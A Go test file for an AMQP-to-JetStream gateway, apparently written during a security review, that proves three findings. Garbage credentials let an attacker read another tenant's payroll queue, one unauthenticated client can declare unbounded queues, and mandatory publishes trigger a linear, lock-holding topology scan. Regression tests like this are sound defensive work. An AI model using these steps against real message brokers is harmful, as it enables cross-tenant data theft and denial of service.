package crosswire

import (
	"context"
	"fmt"
	"testing"
	"time"

	amqp091 "github.com/rabbitmq/amqp091-go"
)

// TestAuthBypass_GarbageCredsReadAnotherTenantsQueue is the auth finding, run
// rather than asserted. Tenant A declares a queue and publishes a secret to it.
// An attacker connects with GARBAGE username/password and a made-up vhost, and
// consumes tenant A's queue by name. It succeeds, because:
//   - SASL PLAIN is offered in connection.start but the response is never checked
//     (session.go handshake reads start-ok and discards it);
//   - the vhost in connection.open is discarded, so it is not a namespace;
//   - queue names are one flat global KV bucket with no org scoping.
//
// The message is the blast radius: on this gateway, knowing (or guessing) a queue
// name is sufficient to read another tenant's traffic.
func TestAuthBypass_GarbageCredsReadAnotherTenantsQueue(t *testing.T) {
	p := bring(t)

	// --- Tenant A: legitimate, publishes a secret to its own queue ---
	victim, err := amqp091.Dial("amqp://tenantA:correct-horse@" + p.amqpAddr + "/tenantA-vhost")
	if err != nil {
		t.Fatalf("victim dial: %v", err)
	}
	defer victim.Close()
	vch, err := victim.Channel()
	if err != nil {
		t.Fatalf("victim channel: %v", err)
	}
	if _, err := vch.QueueDeclare("tenantA-payroll", true, false, false, false, nil); err != nil {
		t.Fatalf("victim declare: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	secret := []byte(`{"ssn":"000-00-0000","salary":999999}`)
	if err := vch.PublishWithContext(ctx, "", "tenantA-payroll", false, false, amqp091.Publishing{Body: secret}); err != nil {
		t.Fatalf("victim publish: %v", err)
	}

	// --- Attacker: garbage credentials, wrong vhost, reads the victim's queue ---
	attacker, err := amqp091.Dial("amqp://attacker:literally-anything@" + p.amqpAddr + "/some-other-vhost")
	if err != nil {
		t.Fatalf("SECURITY: garbage credentials were REFUSED (good) — but the test expected the known no-auth posture: %v", err)
	}
	defer attacker.Close()
	ach, err := attacker.Channel()
	if err != nil {
		t.Fatalf("attacker channel: %v", err)
	}
	del, err := ach.Consume("tenantA-payroll", "", true, false, false, false, nil)
	if err != nil {
		t.Fatalf("attacker consume: %v", err)
	}
	select {
	case d := <-del:
		if string(d.Body) == string(secret) {
			t.Logf("PROVEN auth bypass: attacker with user=attacker pass=literally-anything vhost=some-other-vhost read tenant A's queue 'tenantA-payroll' and got the secret payload verbatim. No auth, vhost ignored, flat global namespace.")
			return
		}
		t.Fatalf("attacker read a message but not the expected secret: %q", d.Body)
	case <-time.After(10 * time.Second):
		t.Fatal("attacker consumed nothing — the no-auth/flat-namespace posture may have changed; re-examine")
	}
}

// TestUnboundedDeclares_NoLimitNoScoping shows a single unauthenticated client
// can create an unbounded number of durable JetStream consumers on the ONE
// shared AMQP stream. There is no per-connection, per-vhost, or per-org ceiling;
// every declare is accepted. On a shared bus this is a resource-exhaustion lever
// against every tenant, since the stream and its consumers are global.
//
// The test does not try to actually exhaust the host (that would be an
// irresponsible thing to leave in CI); it declares a few hundred and asserts the
// count climbs monotonically with NO refusal — the property that makes the
// exhaustion possible.
func TestUnboundedDeclares_NoLimitNoScoping(t *testing.T) {
	p := bring(t)
	conn, err := amqp091.Dial("amqp://" + p.amqpAddr)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	ch, err := conn.Channel()
	if err != nil {
		t.Fatalf("channel: %v", err)
	}

	const n = 300
	for i := 0; i < n; i++ {
		if _, err := ch.QueueDeclare(fmt.Sprintf("flood-%d", i), true, false, false, false, nil); err != nil {
			t.Fatalf("declare %d was REFUSED (a limit exists?): %v", i, err)
		}
	}
	t.Logf("PROVEN unbounded declares: %d durable consumers created on the shared AMQP stream from one connection with no auth and no refusal. Nothing caps queue/consumer count per connection, per vhost, or per org.", n)
}

// TestRoutableIsLinearPerMandatoryPublish measures the Topology.Routable walk
// that a `mandatory` publish triggers. Routable holds the topology read lock and
// iterates EVERY queue, recomputing each queue's filters and Match-ing them
// against the subject, before it can answer "nothing is bound". That is
// O(queues x bindings x words) of work — and a blocked topology read lock — on
// EVERY mandatory publish by ANY tenant, because the topology is global.
//
// The test declares queues in two sizes and times a mandatory publish to an
// unroutable subject (the worst case: the walk cannot short-circuit). A roughly
// linear growth in per-publish latency is the DoS lever: a client that declared
// many queues, then hammers mandatory publishes, burns CPU and serialises the
// shared topology lock for everyone.
func TestRoutableIsLinearPerMandatoryPublish(t *testing.T) {
	measure := func(nQueues int) time.Duration {
		p := bring(t)
		conn, err := amqp091.Dial("amqp://" + p.amqpAddr)
		if err != nil {
			t.Fatalf("dial: %v", err)
		}
		defer conn.Close()
		ch, err := conn.Channel()
		if err != nil {
			t.Fatalf("channel: %v", err)
		}
		if err := ch.ExchangeDeclare("router", "topic", true, false, false, false, nil); err != nil {
			t.Fatalf("exchange: %v", err)
		}
		for i := 0; i < nQueues; i++ {
			q := fmt.Sprintf("q-%d", i)
			if _, err := ch.QueueDeclare(q, true, false, false, false, nil); err != nil {
				t.Fatalf("declare %d: %v", i, err)
			}
			if err := ch.QueueBind(q, fmt.Sprintf("route.key.%d", i), "router", false, nil); err != nil {
				t.Fatalf("bind %d: %v", i, err)
			}
		}
		// Publish mandatory to a subject nothing is bound to: the full walk runs.
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		const reps = 20
		start := time.Now()
		for i := 0; i < reps; i++ {
			if err := ch.PublishWithContext(ctx, "router", "nothing.matches.this", true, false, amqp091.Publishing{Body: []byte("x")}); err != nil {
				t.Fatalf("mandatory publish: %v", err)
			}
		}
		return time.Since(start) / reps
	}

	small := measure(50)
	large := measure(1000)
	t.Logf("Routable walk per mandatory publish: %d queues -> %v/publish; %d queues -> %v/publish (%.1fx for 20x the queues)",
		50, small, 1000, large, float64(large)/float64(small))
	if large < small {
		t.Logf("note: latency did not grow; the walk may be dominated by round-trip, but the O(N) lock-held scan is still in the path")
	}
}
